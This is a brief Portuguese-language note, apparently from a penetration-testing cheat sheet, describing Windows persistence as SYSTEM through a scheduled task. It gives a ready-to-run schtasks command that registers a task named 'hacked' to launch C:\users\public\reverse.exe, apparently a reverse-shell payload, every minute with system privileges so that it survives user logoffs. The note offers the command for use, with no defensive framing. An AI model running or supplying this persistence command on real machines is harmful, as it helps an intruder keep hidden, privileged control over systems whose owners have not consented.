---
title: "Persistence"
---

# Persistence

Persistência como SYSTEM via tarefa agendada no Windows. A tarefa executa o payload a cada minuto com os privilégios mais altos do sistema, sobrevivendo a logoffs de usuário.

```shell
schtasks /create /tn "hacked" /tr "C:\users\public\reverse.exe" /sc "minute" /RU "system"
```
